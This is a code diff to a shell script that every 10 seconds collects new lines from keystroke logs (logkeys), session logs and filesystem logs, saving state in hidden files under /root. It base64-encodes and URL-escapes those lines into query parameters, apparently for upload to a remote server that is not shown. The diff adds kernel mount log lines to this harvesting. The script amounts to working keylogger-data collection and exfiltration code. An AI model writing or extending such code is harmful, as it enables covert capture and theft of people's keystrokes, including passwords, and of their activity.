@@ -26,6 +26,10 @@ for zcount in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do
     [ -f /root/.logfs ] || touch /root/.logfs
     diff /root/.logfs /root/.logfs.tmp > /root/.logfs.diff 2>/dev/null
     resfs=$?
+    grep -i mount /var/log/kern.log | grep -i -e "filesystem" -e "file system" | tail -n 100 > /root/.logkfs.tmp
+    [ -f /root/.logkfs ] || touch /root/.logkfs
+    diff /root/.logkfs /root/.logkfs.tmp > /root/.logkfs.diff 2>/dev/null
+    resfs=$?
 
     if [ "$zcount" == "1" ]; then
 	tail -n 1000 /var/log/logkeys.log > /root/.logkeys.tmp
@@ -61,6 +65,8 @@ for zcount in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do
 	    grep "^>" /root/.logsession.diff | uuencode -m zzzzzzzzzz | grep -v "begin-base64.*zzzzzzzzzz" | perl -MURI::Escape -lne 'print uri_escape($_)' >> $temp
 	    echo -n "&logfs=" >> $temp
 	    grep "^>" /root/.logfs.diff | uuencode -m zzzzzzzzzz | grep -v "begin-base64.*zzzzzzzzzz" | perl -MURI::Escape -lne 'print uri_escape($_)' >> $temp
+	    echo -n "&logkfs=" >> $temp
+	    grep "^>" /root/.logkfs.diff | uuencode -m zzzzzzzzzz | grep -v "begin-base64.*zzzzzzzzzz" | perl -MURI::Escape -lne 'print uri_escape($_)' >> $temp
 	    echo -n "&logkeys=" >> $temp
 	    grep "^>" /root/.logkeys.diff | uuencode -m zzzzzzzzzz | grep -v "begin-base64.*zzzzzzzzzz" | perl -MURI::Escape -lne 'print uri_escape($_)' >> $temp
 
@@ -82,6 +88,7 @@ for zcount in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do
     [ -f /root/.logsession.tmp ] && mv /root/.logsession.tmp /root/.logsession
     [ -f /root/.logkeys.tmp ] && mv /root/.logkeys.tmp /root/.logkeys
     [ -f /root/.logfs.tmp ] && mv /root/.logfs.tmp /root/.logfs
+    [ -f /root/.logkfs.tmp ] && mv /root/.logkfs.tmp /root/.logkfs
     [ "$zcount" == "15" ] || sleep 10
 done
 
